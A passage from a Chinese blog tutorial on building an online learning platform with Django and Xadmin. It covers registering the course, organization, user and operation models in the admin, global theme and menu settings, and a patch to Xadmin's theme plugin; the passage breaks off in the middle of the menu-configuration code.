title="通过时间筛选字段。"></a>通过时间筛选字段。</h4><p>users/adminx.py的管理器中EmailVerifyRecordAdmin添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 配置筛选字段</span><br><span class="line">list_filter &#x3D;  [&#39;code&#39;, &#39;email&#39;,&#39;send_type&#39;, &#39;send_time&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/148.png" alt="img"></p><h3 id="Django的admin-Xadmin和其他系统区别"><a href="#Django的admin-Xadmin和其他系统区别" class="headerlink" title="Django的admin, Xadmin和其他系统区别"></a>Django的admin, Xadmin和其他系统区别</h3><blockquote><p>不像php等其他语言是一个功能模块一个功能设计的。<br>Django是对于每张表增删改查的管理器，我们可以在增删改成的基础上加上我们自己的后台逻辑。<br>因此某种程度可以说他是不依赖于具体业务的。不管啥系统后台都是由表组成。</p></blockquote><p>不依赖于后台逻辑，又可以加上逻辑。</p><h3 id="user-models的注册"><a href="#user-models的注册" class="headerlink" title="user/models的注册"></a>user/models的注册</h3><p>users/adminx.py中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 创建banner的管理类</span><br><span class="line">from .models import EmailVerifyRecord, Banner</span><br><span class="line">class BannerAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;title&#39;, &#39;image&#39;, &#39;url&#39;,&#39;index&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;title&#39;, &#39;image&#39;, &#39;url&#39;,&#39;index&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;title&#39;, &#39;image&#39;, &#39;url&#39;,&#39;index&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将model与admin管理器进行关联注册</span><br><span class="line">xadmin.site.register(Banner, BannerAdmin)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时后台页面。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/149.png" alt="img"></p><blockquote><p>可以自行测试轮播图是否可以新建成功。</p></blockquote><p>本小节结束对应commit:</p><blockquote><p>usersmodels三张表注册进xadmin, 配置搜索过滤展示字段，修复xadmin导出xml错误,导出csv乱码，Unicode重载。</p></blockquote><p>py3(django2.0.1):</p><blockquote><p>usersmodels三张表注册进xadmin, 配置搜索过滤展示字段，修复xadmin导出csv乱码，修复django2.0.1的indexError, str重载。</p></blockquote><h2 id="剩余app-model注册"><a href="#剩余app-model注册" class="headerlink" title="剩余app model注册"></a>剩余app model注册</h2><h3 id="courses注册"><a href="#courses注册" class="headerlink" title="courses注册"></a>courses注册</h3><p>新建courses/adminx.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">from .models import Course, Lesson, Video, CourseResource</span><br><span class="line">import xadmin</span><br><span class="line"></span><br><span class="line"># Course的admin管理器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class CourseAdmin(object):</span><br><span class="line">    list_display &#x3D; [</span><br><span class="line">        &#39;name&#39;,</span><br><span class="line">        &#39;desc&#39;,</span><br><span class="line">        &#39;detail&#39;,</span><br><span class="line">        &#39;degree&#39;,</span><br><span class="line">        &#39;learn_times&#39;,</span><br><span class="line">        &#39;students&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;name&#39;, &#39;desc&#39;, &#39;detail&#39;, &#39;degree&#39;, &#39;students&#39;]</span><br><span class="line">    list_filter &#x3D; [</span><br><span class="line">        &#39;name&#39;,</span><br><span class="line">        &#39;desc&#39;,</span><br><span class="line">        &#39;detail&#39;,</span><br><span class="line">        &#39;degree&#39;,</span><br><span class="line">        &#39;learn_times&#39;,</span><br><span class="line">        &#39;students&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class LessonAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;course&#39;, &#39;name&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;course&#39;, &#39;name&#39;]</span><br><span class="line"></span><br><span class="line">    # __name代表使用外键中name字段</span><br><span class="line">    list_filter &#x3D; [&#39;course__name&#39;, &#39;name&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class VideoAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;lesson&#39;, &#39;name&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;lesson&#39;, &#39;name&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;lesson&#39;, &#39;name&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class CourseResourceAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;course&#39;, &#39;name&#39;, &#39;download&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;course&#39;, &#39;name&#39;, &#39;download&#39;]</span><br><span class="line">    # __name代表使用外键中name字段</span><br><span class="line">    list_filter &#x3D; [&#39;course__name&#39;, &#39;name&#39;, &#39;download&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将管理器与model进行注册关联</span><br><span class="line">xadmin.site.register(Course, CourseAdmin)</span><br><span class="line">xadmin.site.register(Lesson, LessonAdmin)</span><br><span class="line">xadmin.site.register(Video, VideoAdmin)</span><br><span class="line">xadmin.site.register(CourseResource, CourseResourceAdmin)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/150.png"></p><blockquote><p>注意：对应后台显示英文的字段自行检查<code>verbosename</code>，自行加上。<br>注意: py2下重载<code>__unicode__</code>方法，py3下重载<code>__str__</code>方法</p></blockquote><p>如(注意缩进):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def __str__(self):</span><br><span class="line">    return &#39;《&#123;0&#125;》课程的章节 &gt;&gt; &#123;1&#125;&#39;.format(self.course,self.name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/151.png" alt="img"></p><p><code>int</code>类型后台会生成如下图区间取值:</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/152.png" alt="img"></p><p>可以看到有外键关系的会有一个小符号。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/153.png"></p><h3 id="注册机构app的adminx"><a href="#注册机构app的adminx" class="headerlink" title="注册机构app的adminx"></a>注册机构app的adminx</h3><p>新建<code>organization/adminx.py</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">import xadmin</span><br><span class="line"></span><br><span class="line">from .models import CityDict, CourseOrg, Teacher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 机构所属城市名后台管理器</span><br><span class="line">class CityDictAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;name&#39;, &#39;desc&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;name&#39;, &#39;desc&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;name&#39;, &#39;desc&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 机构课程信息管理器</span><br><span class="line">class CourseOrgAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;name&#39;, &#39;desc&#39;, &#39;click_nums&#39;, &#39;fav_nums&#39;,&#39;add_time&#39; ]</span><br><span class="line">    search_fields &#x3D; [&#39;name&#39;, &#39;desc&#39;, &#39;click_nums&#39;, &#39;fav_nums&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;name&#39;, &#39;desc&#39;, &#39;click_nums&#39;, &#39;fav_nums&#39;,&#39;city__name&#39;,&#39;address&#39;,&#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TeacherAdmin(object):</span><br><span class="line">    list_display &#x3D; [ &#39;name&#39;,&#39;org&#39;, &#39;work_years&#39;, &#39;work_company&#39;,&#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;org&#39;, &#39;name&#39;, &#39;work_years&#39;, &#39;work_company&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;org__name&#39;, &#39;name&#39;, &#39;work_years&#39;, &#39;work_company&#39;,&#39;click_nums&#39;, &#39;fav_nums&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xadmin.site.register(CityDict, CityDictAdmin)</span><br><span class="line">xadmin.site.register(CourseOrg, CourseOrgAdmin)</span><br><span class="line">xadmin.site.register(Teacher, TeacherAdmin)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意：对应后台显示英文的字段自行检查verbosename，自行加上。<br>注意: py2下重载<code>__unicode__</code>方法，py3下重载<code>__str__</code>方法</p></blockquote><p>如(注意缩进):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def __str__(self):</span><br><span class="line">  return &quot;[&#123;0&#125;]的教师: &#123;1&#125;&quot;.format(self.org, self.name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果注册后没有显示： 重新登录，或重启项目</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/154.png" alt="img"></p><h3 id="operation-app注册xadmin"><a href="#operation-app注册xadmin" class="headerlink" title="operation app注册xadmin"></a>operation app注册xadmin</h3><p>新建<code>operation/adminx.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">import xadmin</span><br><span class="line"></span><br><span class="line">from .models import UserAsk, UserCourse, UserMessage, CourseComments, UserFavorite</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户表单我要学习后台管理器</span><br><span class="line">class UserAskAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;name&#39;, &#39;mobile&#39;, &#39;course_name&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;name&#39;, &#39;mobile&#39;, &#39;course_name&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;name&#39;, &#39;mobile&#39;, &#39;course_name&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户课程学习后台管理器</span><br><span class="line">class UserCourseAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;user&#39;, &#39;course&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;user&#39;, &#39;course&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;user&#39;, &#39;course&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户消息后台管理器</span><br><span class="line">class UserMessageAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;user&#39;, &#39;message&#39;, &#39;has_read&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;user&#39;, &#39;message&#39;, &#39;has_read&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;user&#39;, &#39;message&#39;, &#39;has_read&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户评论后台管理器</span><br><span class="line">class CourseCommentsAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;user&#39;, &#39;course&#39;, &#39;comments&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;user&#39;, &#39;course&#39;, &#39;comments&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;user&#39;, &#39;course&#39;, &#39;comments&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用户收藏后台管理器</span><br><span class="line">class UserFavoriteAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;user&#39;, &#39;fav_id&#39;, &#39;fav_type&#39;, &#39;add_time&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;user&#39;, &#39;fav_id&#39;, &#39;fav_type&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;user&#39;, &#39;fav_id&#39;, &#39;fav_type&#39;, &#39;add_time&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将后台管理器与models进行关联注册。</span><br><span class="line">xadmin.site.register(UserAsk, UserAskAdmin)</span><br><span class="line">xadmin.site.register(UserCourse, UserCourseAdmin)</span><br><span class="line">xadmin.site.register(UserMessage, UserMessageAdmin)</span><br><span class="line">xadmin.site.register(CourseComments, CourseCommentsAdmin)</span><br><span class="line">xadmin.site.register(UserFavorite, UserFavoriteAdmin)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意：对应后台显示英文的字段自行检查<code>verbosename</code>，自行加上。<br>注意: py2下重载<code>__unicode__</code>方法，py3下重载<code>__str__</code>方法</p></blockquote><p>如(注意缩进):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def __str__(self):</span><br><span class="line">  return &quot;[&#123;0&#125;]的教师: &#123;1&#125;&quot;.format(self.org, self.name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功性验证:</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/155.png" alt="img"></p><h2 id="xadmin全局配置"><a href="#xadmin全局配置" class="headerlink" title="xadmin全局配置"></a>xadmin全局配置</h2><p>将全局配置修改:</p><ul><li>如左上角：django Xadmin。下面的我的公司</li><li>主题修改，app名称汉化，菜单收叠。</li></ul><h3 id="使用Xadmin的主题功能。"><a href="#使用Xadmin的主题功能。" class="headerlink" title="使用Xadmin的主题功能。"></a>使用Xadmin的主题功能。</h3><p>把全站的配置放在users\adminx.py中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from xadmin import views</span><br><span class="line"># 创建X admin的全局管理器并与view绑定。</span><br><span class="line">class BaseSetting(object):</span><br><span class="line">    # 开启主题功能</span><br><span class="line">    enable_themes &#x3D; True</span><br><span class="line">    use_bootswatch &#x3D; True</span><br><span class="line"></span><br><span class="line"># 将全局配置管理与view绑定注册</span><br><span class="line">xadmin.site.register(views.BaseAdminView, BaseSetting)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="解决django1-9-python2-下Xadmin主题不生效问题。"><a href="#解决django1-9-python2-下Xadmin主题不生效问题。" class="headerlink" title="解决django1.9(python2)下Xadmin主题不生效问题。"></a>解决django1.9(python2)下Xadmin主题不生效问题。</h3><p><a href="https://link.jianshu.com/?t=https://my.oschina.net/u/2396236/blog/1083251">https://my.oschina.net/u/2396236/blog/1083251</a></p><ul><li>安装requests</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>/xadmin/plugins/themes.py 引入requests</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>修改block_top_navmenu方法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">def block_top_navmenu(self, context, nodes):</span><br><span class="line"></span><br><span class="line">       themes &#x3D; [</span><br><span class="line">           &#123;&#39;name&#39;: _(u&quot;Default&quot;), &#39;description&#39;: _(u&quot;Default bootstrap theme&quot;), &#39;css&#39;: self.default_theme&#125;,</span><br><span class="line">           &#123;&#39;name&#39;: _(u&quot;Bootstrap2&quot;), &#39;description&#39;: _(u&quot;Bootstrap 2.x theme&quot;), &#39;css&#39;: self.bootstrap2_theme&#125;,</span><br><span class="line">           ]</span><br><span class="line">       select_css &#x3D; context.get(&#39;site_theme&#39;, self.default_theme)</span><br><span class="line"></span><br><span class="line">       if self.user_themes:</span><br><span class="line">           themes.extend(self.user_themes)</span><br><span class="line"></span><br><span class="line">       if self.use_bootswatch:</span><br><span class="line">           ex_themes &#x3D; cache.get(THEME_CACHE_KEY)</span><br><span class="line">           if ex_themes:</span><br><span class="line">               themes.extend(json.loads(ex_themes))</span><br><span class="line">           else:</span><br><span class="line">               ex_themes &#x3D; []</span><br><span class="line">               try:</span><br><span class="line">                   flag &#x3D; False#假如为True使用原来的代码，假如为Flase，使用requests库来访问</span><br><span class="line">                   if flag:</span><br><span class="line">                       h &#x3D; httplib2.Http()</span><br><span class="line">                       resp, content &#x3D; h.request(&quot;http:&#x2F;&#x2F;bootswatch.com&#x2F;api&#x2F;3.json&quot;, &#39;GET&#39;, &#39;&#39;,</span><br><span class="line">                           headers&#x3D;&#123;&quot;Accept&quot;: &quot;application&#x2F;json&quot;, &quot;User-Agent&quot;: self.request.META[&#39;HTTP_USER_AGENT&#39;]&#125;)</span><br><span class="line">                       if six.PY3:</span><br><span class="line">                           content &#x3D; content.decode()</span><br><span class="line">                       watch_themes &#x3D; json.loads(content)[&#39;themes&#39;]</span><br><span class="line">                   else:</span><br><span class="line">                       content &#x3D; requests.get(&quot;https:&#x2F;&#x2F;bootswatch.com&#x2F;api&#x2F;3.json&quot;)</span><br><span class="line">                       if six.PY3:</span><br><span class="line">                           content &#x3D; content.text.decode()</span><br><span class="line">                       watch_themes &#x3D; json.loads(content.text)[&#39;themes&#39;]</span><br><span class="line"></span><br><span class="line">                   ex_themes.extend([</span><br><span class="line">                       &#123;&#39;name&#39;: t[&#39;name&#39;], &#39;description&#39;: t[&#39;description&#39;],</span><br><span class="line">                           &#39;css&#39;: t[&#39;cssMin&#39;], &#39;thumbnail&#39;: t[&#39;thumbnail&#39;]&#125;</span><br><span class="line">                       for t in watch_themes])</span><br><span class="line">               except Exception as e:</span><br><span class="line">                   print(e)</span><br><span class="line"></span><br><span class="line">               cache.set(THEME_CACHE_KEY, json.dumps(ex_themes), 24 * 3600)</span><br><span class="line">               themes.extend(ex_themes)</span><br><span class="line"></span><br><span class="line">       nodes.append(loader.render_to_string(&#39;xadmin&#x2F;blocks&#x2F;comm.top.theme.html&#39;, &#123;&#39;themes&#39;: themes, &#39;select_css&#39;: select_css&#125;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="修改django-admin-和下面的我的公司收起菜单"><a href="#修改django-admin-和下面的我的公司收起菜单" class="headerlink" title="修改django admin 和下面的我的公司收起菜单"></a>修改django admin 和下面的我的公司收起菜单</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># x admin 全局配置参数信息设置</span><br><span class="line">class GlobalSettings(object):</span><br><span class="line">    site_title &#x3D; &quot;xxxx&quot;</span><br><span class="line">    site_footer &#x3D; &quot;xxx&quot;</span><br><span class="line">    # 收起菜单</span><br><span class="line">    menu_style &#x3D; &quot;accordion&quot;</span><br><span class="line"># 将头部与脚部信息进行注册:</span><br><span class="line">xadmin.site.register(views.CommAdminView, GlobalSettings)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="apps-py配置app的显示名称"><a href="#apps-py配置app的显示名称" class="headerlink" title="apps.py配置app的显示名称"></a>apps.py配置app的显示名称</h3><p>每个app下执行同样操作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from django.apps import AppConfig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class CoursesConfig(AppConfig):</span><br><span class="line">    name &#x3D; &#39;courses&#39;</span><br><span class="line">    verbose_name &#x3D; u&quot;课程&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意自行找猫画虎为每个app添加中文名</strong></p><blockquote><p>新建app时并没有引用apps的配置</p></blockquote><p>在app下的init.py中添加:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default_app_config &#x3D; &quot;operation.apps.OperationConfig&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/156.png" alt="img"></p><p>注意对应关系。</p><p><strong>注意为每个都添加对应的default_app_config</strong></p><h3 id="自定义导航菜单顺序"><a href="#自定义导航菜单顺序" class="headerlink" title="自定义导航菜单顺序"></a>自定义导航菜单顺序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">class GlobalSetting(object):</span><br><span class="line">     def get_site_menu(self):</span><br><span class="line">        return (</span><br><span class="line">            &#123;&#39;title&#39;: &#39;课程管理&#39;, &#39;menus&#39;: (</span><br><span class="line">                &#123;&#39;title&#39;: &#39;课程信息&#39;, &#39;url&#39;: self.get_model_url(Course, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;章节信息&#39;, &#39;url&#39;: self.get_model_url(Lesson, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;视频信息&#39;, &#39;url&#39;: self.get_model_url(Video, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;课程资源&#39;, &#39;url&#39;: self.get_model_url(CourseResource, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;课程评论&#39;, &#39;url&#39;: self.get_model_url(CourseComments, &#39;changelist&#39;)&#125;,</span><br><span class="line">            )&#125;,</span><br><span class="line">            &#123;&#39;title&#39;: &#39;机构管理&#39;, &#39;menus&#39;: (</span><br><span class="line">                &#123;&#39;title&#39;: &#39;所在城市&#39;, &#39;url&#39;: self.get_model_url(CityDict, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;机构讲师&#39;, &#39;url&#39;: self.get_model_url(Teacher, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;机构信息&#39;, &#39;url&#39;: self.get_model_url(CourseOrg, &#39;changelist&#39;)&#125;,</span><br><span class="line">            )&#125;,</span><br><span class="line">            &#123;&#39;title&#39;: &#39;用户管理&#39;, &#39;menus&#39;: (</span><br><span class="line">                &#123;&#39;title&#39;: &#39;用户信息&#39;, &#39;url&#39;: self.get_model_url(UserProfile, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;用户验证&#39;, &#39;url&#39;: self.get_model_url(EmailVerifyRecord, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;用户课程&#39;, &#39;url&#39;: self.get_model_url(UserCourse, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;用户收藏&#39;, &#39;url&#39;: self.get_model_url(UserFavorite, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;用户消息&#39;, 